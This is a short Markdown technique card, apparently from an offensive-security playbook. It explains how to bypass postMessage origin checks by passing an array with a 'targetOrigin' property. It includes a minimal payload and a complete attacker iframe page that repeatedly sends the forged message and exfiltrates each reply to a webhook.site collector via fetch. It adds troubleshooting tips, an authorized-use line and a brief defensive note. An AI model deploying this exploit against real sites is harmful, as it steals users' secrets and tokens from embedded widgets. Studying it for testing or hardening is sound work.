# postMessage Array targetOrigin Bypass

## Context

Use only in authorized labs, owned applications, in-scope bug bounty targets, or defensive validation.

Apply when:

- a widget validates `event.data.origin` with `new URL(origin).hostname` or similar string coercion
- the widget calls `postMessage(secret, origin)` using that same value
- the widget replies to `window.parent` from an iframe
- string parser-confusion payloads such as `https://trusted@attacker` are blocked or not applicable

## Minimal Payload

```javascript
const origin = ['https://trusted.example'];
origin.targetOrigin = location.origin;
iframe.contentWindow.postMessage({ origin }, '*');
```

Replace `trusted.example` with the allowlisted hostname.

## Full iframe Receiver Example

```html
<!DOCTYPE html>
<iframe id="iframe" src="https://[provider]/embed/handoff"></iframe>
<script>
const webhook = 'https://webhook.site/[uuid]';

window.addEventListener('message', (e) => {
  fetch(webhook + '?d=' + encodeURIComponent(e.data));
});

iframe.onload = () => {
  setInterval(() => {
    const origin = ['https://trusted.example'];
    origin.targetOrigin = location.origin;
    iframe.contentWindow.postMessage({ origin }, '*');
  }, 300);
};
</script>
```

## Why iframe, Not popup

Use iframe when the vulnerable code calls `window.parent.postMessage(...)`. A popup's `window.parent` is itself, so the attacker page will not receive the reply.

Use popup only when the sink is `window.opener`.

## Why It Works

- `new URL(origin)` stringifies arrays before parsing.
- `postMessage(data, origin)` treats object/array second arguments as `WindowPostMessageOptions`.
- The browser reads the fixed property name `targetOrigin`, which the attacker sets to their own origin.

## Why It Fails

- `typeof origin === 'string'` guard exists
- code validates `event.origin`
- code passes a fresh literal string to `postMessage`, not the attacker object
- secrets are `HttpOnly` and never appear in `document.cookie`
- third-party cookies are blocked and the lab does not use a reviewer bot

## Common Mistakes

- Using `window.open` when the sink is `window.parent`
- Forgetting to set `origin.targetOrigin`
- Sending the forged message only once
- Using `http://` collectors from an `https://` exploit page (mixed content)
- Treating empty webhook callbacks as failure before the reviewer bot runs

## Defensive Note

Never pass attacker-controlled values directly as the `postMessage` target. Validate `event.origin`, require a string `targetOrigin`, and keep validation input separate from delivery input.
